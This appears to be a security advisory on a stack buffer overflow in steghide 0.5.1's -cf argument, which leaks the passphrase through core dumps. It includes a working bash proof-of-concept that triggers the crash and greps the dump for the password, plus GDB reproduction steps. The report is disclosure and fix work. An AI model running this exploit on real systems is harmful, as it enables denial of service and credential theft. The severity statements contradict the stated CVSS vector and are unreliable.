# Vulnerability Report: Steghide Stack-Based Buffer Overflow & Information Disclosure

| Field | Value |
|------|-------|
| Target Application | Steghide (Linux Binary) |
| Affected Version | 0.5.1 (Confirmed); earlier versions likely affected |
| Vulnerability Type | Stack-Based Buffer Overflow (CWE-121) |
| Impact | Denial of Service (DoS), Information Disclosure |
| Testing Environment | Kali Linux |
| Disclosure Date | January 16, 2026 |
| Author | Erik Dervishi |
| Software Link | https://salsa.debian.org/pkg-security-team/steghide |
| CVSS v3.1 Score | **5.5 (Medium)** |
| CVSS Vector | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H |

**Severity Rationale:**  
The High severity score reflects reliable local exploitation leading to both
denial of service and disclosure of sensitive credentials via core dumps.

## 1. Description

A stack-based buffer overflow vulnerability was identified in the **steghide** command-line utility (version 0.5.1). The vulnerability is triggered when passing an excessively long filepath to the **-cf** (cover file) argument.

While the application is compiled with Stack Smashing Protection (SSP/Canary), which successfully prevents immediate Arbitrary Code Execution (RCE) by aborting the process, this defensive mechanism creates a secondary vulnerability: Information Disclosure.

Analysis confirms that sensitive runtime data—specifically the passphrase passed via the **-p** argument—remains exposed in the process stack memory at the moment of the crash. On systems configured to retain core dumps (common in development, CI/CD, or misconfigured production servers), this sensitive data is written to disk in plain text, allowing attackers to recover credentials.

# 2. Attack Prerequisites (Threat Model)
To successfully exploit this vulnerability for Information Disclosure, the following conditions must be met:

- **Local Access:** The attacker must have local access to the system or the ability to pass arguments to the steghide binary (e.g., via a web shell or wrapper script).

- **Core Dumps Enabled:** The target environment must be configured to generate core dumps (e.g., ulimit -c unlimited or fs.suid_dumpable=1) and write them to a location accessible by the attacker.

- **Credentials in Memory:** The victim must execute the command using the -p (passphrase) argument.

## 3. Technical Analysis

## 3.1 Root Cause Analysis

The vulnerability exists in **src/Embedder.cc**. The application fails to bound-check the length of the filename string before formatting it into a fixed-size buffer using **sprintf**.

Vulnerable Code Snippet:

```cpp
// src/Embedder.cc
char buf[200]; 
// Unsafe usage of sprintf without length validation
sprintf(buf, _("embedding %s in %s..."), embstring.c_str(), cvrstring.c_str());
```

If the combined length of the strings exceeds 200 bytes, **sprintf** writes past the end of **buf**, corrupting the stack.

### 3.2 Crash Mechanism

The binary is compiled with GCC's Stack Protector.

1. **Overflow**: The user input overwrites the stack, including the "canary".
1. **Detection**: Upon function return, the system checks the canary.
1. **Termination**: The system detects corruption, triggers **__stack_chk_fail**, and raises **SIGABRT**.

Because **__stack_chk_fail** invokes **abort()** immediately, the process termination is abrupt. On modern Linux systems (e.g., using **systemd-coredump**), this rapid termination can sometimes result in the core dump being discarded or truncated unless the system is explicitly configured to force dump creation.

## 4. Proof of Concept (PoC)

### 4.1 Automated Reproduction Script

The following bash script configures the environment to force a physical core dump and extracts the password.

**Prerequisite:** Ensure **ulimit** is set and the core pattern is directed to a file (requires root for setup, but the exploit runs as user).

```bash
# Setup (Run once as root/sudo to ensure visibility):
# echo "core" | sudo tee /proc/sys/kernel/core_pattern
```

File: **poc.sh**

```bash
#!/bin/bash
# Steghide 0.5.1 PoC - Stack Overflow & Info Leak
# Usage: ./poc.sh

# 1. Enable core dumps for this session
ulimit -c unlimited

# 2. Define payload: 250 'A' characters (sufficient to overflow 200 byte buffer)
LONG_DIR="crash_test"
LONG_NAME=$(python3 -c "print('A' * 250 + '.wav')")
FULL_PATH="$LONG_DIR/$LONG_NAME"

echo "[*] Creating malicious directory structure..."
rm -rf "$LONG_DIR" core* 2>/dev/null
mkdir -p "$LONG_DIR"

# 3. Generate valid WAV file (Required to bypass initial format checks)
python3 -c "
import struct
with open('$FULL_PATH', 'wb') as f:
    # RIFF Header + WAVEfmt + PCM Audio + Data Chunk
    # We provide a valid header so execution reaches the vulnerable Embedder.cc logic
    header = b'RIFF' + struct.pack('<I', 50000) + b'WAVEfmt ' + struct.pack('<I', 16)
    header += struct.pack('<HHIIHH', 1, 1, 44100, 44100, 2, 16)
    header += b'data' + struct.pack('<I', 49964)
    f.write(header + b'\x00' * 49964)
"

# 4. Create dummy secret
echo "CONFIDENTIAL_DATA" > secret.txt

# 5. Trigger Crash
# The passphrase 'MY_SECRET_PASS' will be loaded into memory before the crash
echo "[!] Launching Steghide..."
steghide embed -cf "$FULL_PATH" -ef secret.txt -p MY_SECRET_PASS

# 6. Verify Leak
echo -e "\n[*] Searching for artifact in core dump..."
CORE_FILE=$(ls core* | head -n 1)

if [ -f "$CORE_FILE" ]; then
    echo "[+] Dump found: $CORE_FILE"
    # Search for the password string inside the binary dump
    strings "$CORE_FILE" | grep "MY_SECRET_PASS" && echo -e "\n[!!!] CRITICAL: Password successfully leaked from crash dump!"
else
    echo "[-] No core file found. Check 'ulimit -c' or '/proc/sys/kernel/core_pattern'."
fi
```

### 4.2 Dynamic Analysis (GDB)

Manual verification of the memory state using GDB (with Pwndbg extension).

**Steps to Reproduce:**

1. Run GDB on the binary:

```
gdb --args /usr/bin/steghide embed -cf $(python3 -c "print('A'*200 + '/trigger.wav')") -ef secret.txt -p MY_SECRET_PASS
```

2. Run the process:

```
pwndbg> run
```

3. Upon **SIGABRT**, search memory for the passphrase:

```
pwndbg> search "MY_SECRET_PASS"
```

**Observed Output:**

```
*** buffer overflow detected ***: terminated
Program received signal SIGABRT

pwndbg> search "MY_SECRET_PASS"
Searching for value: 'MY_SECRET_PASS'
[heap]  0x5555555bb1a8 'MY_SECRET_PASS'
[stack] 0x7fffffffd680 'MY_SECRET_PASS'
```

**Conclusion:** The sensitive string **MY_SECRET_PASS** persists in both Heap and Stack memory segments at the moment of the crash, confirming the Information Disclosure vector.

## 5. Impact Assessment

- **Confidentiality (High):**
    - **Direct Leak:** The crash exposes command-line arguments (passwords) in the memory dump.
    - **Privilege Escalation Risk:** While core dumps usually retain the user's permissions (**0600**), misconfigured systems (using global dump directories like **/tmp** or insecure umasks) allows low-privileged users to read dumps generated by higher-privileged users (e.g., root) or service accounts (e.g.,**www-data**), leading to credential theft.

- **Availability (High):**
    - The vulnerability guarantees a reliable application crash (DoS), disrupting automated services using Steghide.

- **Integrity (Low):**
    - Code execution is currently mitigated by SSP/Canaries.

## 6. Recommendations

1. **Code Fix:** Replace unsafe sprintf calls with snprintf to enforce buffer size limits.

```cpp
// Recommended Fix
snprintf(buf, sizeof(buf), _("embedding %s in %s..."), ...);
```
